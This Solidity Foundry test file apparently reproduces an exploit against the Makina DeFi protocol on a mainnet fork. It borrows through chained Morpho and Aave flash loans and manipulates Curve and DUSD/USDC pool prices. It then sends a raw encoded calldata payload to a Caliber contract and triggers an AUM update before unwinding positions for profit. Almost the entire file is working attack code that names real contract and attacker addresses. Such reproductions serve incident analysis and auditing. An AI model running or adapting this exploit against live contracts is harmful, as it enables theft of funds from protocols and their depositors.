// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Attack} from "../src/AttackContract.sol";
// Simple interface to check balances
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address account, uint256 value) external;
}
interface Morpho{
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}
interface AavePool{
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode) external;
}
interface IMakina {
    function add_liquidity(uint256[] memory _amounts, uint256 min_amount) external returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
    function remove_liquidity_one_coin(uint256 amount, int128 i, uint256 min) external;
    function updateTotalAum() external returns (uint256);
}
interface ICurve{
    function add_liquidity(uint256[3] memory _amounts, uint256 min_amount) external; 
    function add_liquidity(uint256[2] memory _amounts, uint256 min_amount) external; 
}

contract MakinaForkTest is Test {
    address Caliber = 0xD1A1C248B253f1fc60eACd90777B9A63F8c8c1BC;
    address Makina = 0x6b006870C83b1Cd49E766Ac9209f8d68763Df721;
    address  DUSD = 0x1e33E98aF620F1D563fcD3cfd3C75acE841204ef; 
    address  USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;
    address  ATTACKER = 0x935bfb495E33f74d2E9735DF1DA66acE442ede48;
    uint256  BLOCK_NUMBER = 24273361;
    address  MORPHO_ADDRESS = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address  AAVE_POOL_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address  underlying = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c;
    address CRV = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
    address mim_crv = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B; 
    Attack public attack;
    uint256 dusd_usddc_liquidity = 100*1e12;
    uint256 Curve_liquidity = 170*1e12;
    uint256  dusd_usdc_exchange = 10*1e12;
    address  DUSDUSDC = 0x32E616F4f17d43f9A5cd9Be0e294727187064cb3;
    address Curve_DCT= 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;
    uint256 mim_crv_liquidity = 30*1e24;
    uint256 mim_crv_exchange = 120*1e24;
    // struct Instruction {
    //         uint256 positionId;
    //         bool isDebt;
    //         uint256 groupId;
    //         InstructionType instructionType;
    //         address[] affectedTokens;
    //         bytes32[] commands;
    //         bytes[] state;
    //         uint128 stateBitmap;
    //         bytes32[] merkleProof;
    //     }

    function setUp() public {
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpcUrl, BLOCK_NUMBER); 
        attack = new Attack();
    }

    function testStateAtFork() public {
        assertEq(block.number, BLOCK_NUMBER);
    }
    function allowance() internal {
        IERC20(USDC).approve(DUSDUSDC, type(uint256).max);
        IERC20(DUSD).approve(DUSDUSDC, type(uint256).max);
        IERC20(USDC).approve(Curve_DCT, type(uint256).max);
        IERC20(CRV).approve(mim_crv, type(uint256).max);
        IERC20(MIM).approve(mim_crv, type(uint256).max);
        IERC20(USDC).approve(AAVE_POOL_ADDRESS, type(uint256).max);
        IERC20(USDC).approve(MORPHO_ADDRESS, type(uint256).max);
    }

    function testcallFlashLoan() public {
        uint256 mophoBalance = IERC20(USDC).balanceOf(MORPHO_ADDRESS);
        console.log("Mopho balance:", mophoBalance/1e6);
        console.log("DUSDUSDC pool balance:", IERC20(USDC).balanceOf(DUSDUSDC)/1e6);
        console.log("bal;ance of underlying contract", IERC20(USDC).balanceOf(underlying)/1e6);
        bytes memory data = abi.encode(1111, "zabi");
        Morpho(MORPHO_ADDRESS).flashLoan(USDC, mophoBalance, data);
        console.log("final usdc balance", IERC20(USDC).balanceOf(address(this))/1e6);
    }

    function onMorphoFlashLoan(uint256 amount, bytes memory data) public returns (bool) {
        require(msg.sender == MORPHO_ADDRESS, "Not Morpho");
        console.log("Funds received", amount, string(data));
        AavePool(AAVE_POOL_ADDRESS).flashLoanSimple(address(this), USDC, 120*1e6*1e6, data, 0);
        return true;
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 totalPremium,
        address user,
        bytes memory params
      ) public returns (bool) {
        allowance();
        // ------
        console.log("balance:", IERC20(USDC).balanceOf(address(this))/1e6);
        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = dusd_usddc_liquidity;
        _amounts[1] = 0;
        IMakina(DUSDUSDC).add_liquidity(_amounts, 0);
        IMakina(DUSDUSDC).exchange(0, 1, dusd_usdc_exchange, 0);
        console.log("dusd balance", IERC20(DUSD).balanceOf(address(this))/1e18);
        // -----
        uint256[3] memory amounts_curve;
        amounts_curve[0] = 0;
        amounts_curve[1] = Curve_liquidity;
        amounts_curve[2] = 0;
        ICurve(Curve_DCT).add_liquidity(amounts_curve, 0);
        console.log("crv balance", IERC20(CRV).balanceOf(address(this))/1e18);
        uint256[2] memory amount_mim_crv;
        amount_mim_crv[1] = mim_crv_liquidity;
        amount_mim_crv[0] = 0;
        ICurve(mim_crv).add_liquidity(amount_mim_crv, 0);
        
        console.log("mim_crv balance", IERC20(mim_crv).balanceOf(address(this))/1e18);
        IMakina(mim_crv).remove_liquidity_one_coin(mim_crv_liquidity/2, 0, 0);
        uint256 balance_before = IERC20(MIM).balanceOf(address(this));
        console.log("mim balance", balance_before/1e18);
        IMakina(mim_crv).exchange(1, 0, mim_crv_exchange, 0);
        uint256 difference = IERC20(MIM).balanceOf(address(this)) - balance_before;
        console.log("mim balance difference", difference/1e18);
        bytes memory data2 = hex"9341a475000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000f819a666d560f6ce6f065fe9be046950000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000001f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000062000000000000000000000000000000000000000000000000000000000000000030000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000000000000b70a082310104ff0000000004fd5abf66b003881b88567eb9ed9c651f14dc47716d5433e6010406ff00000004836c9007dbd73fcfc473190304c72b7e39babb91cc2b27d7810406ff000000845a6a4d54456819380173272a5e8e9b9904bdf41b62de91e9018405ff000000046e2ed2f457c41f38556ab0c2b1185cc9e6563d8d18160ddd01ff0000000000086c3f90f043a72fa612cbac8115ee7e52bde6e4904903b0d10105ff0000000005bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10106ff0000000006bebc44782c7db0a1a60cb6fe97d0b483032ff1c74903b0d10107ff0000000007bebc44782c7db0a1a60cb6fe97d0b483032ff1c7aa9a091201050408ff000000836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201060408ff000001836c9007dbd73fcfc473190304c72b7e39babb91aa9a091201070408ff000002836c9007dbd73fcfc473190304c72b7e39babb910000000000000000000000000000000000000000000000000000000000000009000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000001400000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000001c000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000240000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000002c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000d1a1c248b253f1fc60eacd90777b9a63f8c8c1bc00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007a7a3f0f3dbca12895d1f9424e8d0a924d50c92edfec3f817082763f73cb4cd5af326b46750aa6deec7344bb6f7243a395bcfde2680300e16f1bbff78672cbf3c8c6626860a4b2368ed8caf9fd5b14b90d151c3ca390b7aff38dfe7003b5d421d166be3838e86d1af766aeb93493d81b89e564c96c2f8decb94b400912de6afedede17ea0feb39c3e2c3b900b4a95f239f010c251afb46a89984d868151c5b209bf97f0d554ad3b05a210efb4de2a4930747e423e87b1fb139b63fcc94f17e286ae44b282d93e68621a7e6efa1e9b9893cc74b52a65196a60693a9e325c0fc401";
        (bool h, ) = Caliber.call{value: 0}(data2);
        console.log(h);
        console.log("Value Aum", IMakina(Makina).updateTotalAum());

        IMakina(DUSDUSDC).exchange(1, 0, IERC20(DUSD).balanceOf(address(this)), 0);
        IMakina(DUSDUSDC).remove_liquidity_one_coin(IERC20(DUSDUSDC).balanceOf(address(this)), 0, 0);
        IMakina(mim_crv).exchange(0, 1, difference, 0);
        IMakina(mim_crv).remove_liquidity_one_coin(IERC20(mim_crv).balanceOf(address(this)), 1, 0);
        IMakina(mim_crv).exchange(0, 1, IERC20(MIM).balanceOf(address(this)), 0);

        IMakina(Curve_DCT).remove_liquidity_one_coin(IERC20(CRV).balanceOf(address(this)), 1, 0);

        
        return true;
    }

    
}